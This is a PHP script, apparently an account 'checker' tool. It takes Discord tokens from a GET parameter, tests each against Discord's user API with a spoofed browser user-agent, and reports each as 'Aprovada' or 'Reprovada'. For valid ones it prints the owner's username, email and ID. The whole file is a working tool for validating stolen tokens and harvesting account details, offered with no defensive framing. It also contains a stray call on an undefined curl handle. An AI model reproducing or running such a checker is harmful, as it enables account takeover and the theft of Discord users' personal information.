<?php


error_reporting(0);

function haikaget($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

$token = $_GET['lista'];

$time = time();

function haika1(array $options){
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $options['url']);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "PATCH");
    if (in_array("post" , array_keys($options))){
      curl_setopt($curl, CURLOPT_POST, 1);
      curl_setopt($curl, CURLOPT_POSTFIELDS, $options['post']);
    }
    if (in_array('headers', array_keys($options))){
      curl_setopt($curl, CURLOPT_HTTPHEADER, $options['headers']);
    }
    if (in_array('header', array_keys($options))){
      curl_setopt($curl, CURLOPT_HEADER, 1);
    }
    if (in_array('UserCookies', array_keys($options))){
      curl_setopt($curl, CURLOPT_COOKIEJAR, $GLOBALS['dirCcookies']);
      curl_setopt($curl, CURLOPT_COOKIEFILE, $GLOBALS['dirCcookies']);
    }
    curl_setopt($curl, CURLOPT_ACCEPT_ENCODING, 'GZIP');
    $response = curl_exec($curl);
    curl_close($curl);
    return $response;
}

 $token1 = haika1([
    'url' => 'https://discord.com/api/v9/users/@me',
    'UserCookies' => true,
    'headers' =>[
    'accept: */*',
    'accept-language: pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
    'authorization: '.$token.'',
    'content-type: application/json',
    'origin: https://discord.com',
    'referer: https://discord.com/channels/@me',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.35',
    ],
]);
$puxarnome = haikaget($token1, '"username": "','",');
$email = haikaget($token1, '"email": "','",');
$id = haikaget($token1, '"id": "','",');

if(stripos($token1, "id")){
    echo '<span class="badge badge-success">#Aprovada</span> '.$token.' | <span class="badge badge-info">Retorno:</span> [ Login Efetuado Com Sucesso! ] | </span> <span class="badge badge-info">NICK:</span> '.$puxarnome.' | <span class="badge badge-info">EMAIL:</span> '.$email.'</span> | <span class="badge badge-info">ID:</span> '.$id.' | Tempo De Resposta: '.(time() - $time).' | <span class="badge badge-light">@Haika.php</span></br>';  

}else{ 
echo '<br><span class="badge badge-danger">Reprovada</span> '.$token.' | <span class="badge badge-info">Retorno:</span> [ Token Não Encontrado ] | Tempo De Resposta: '.(time() - $time).' | <span class="badge badge-light">@Haika.php</span></br>';
}
  
?>
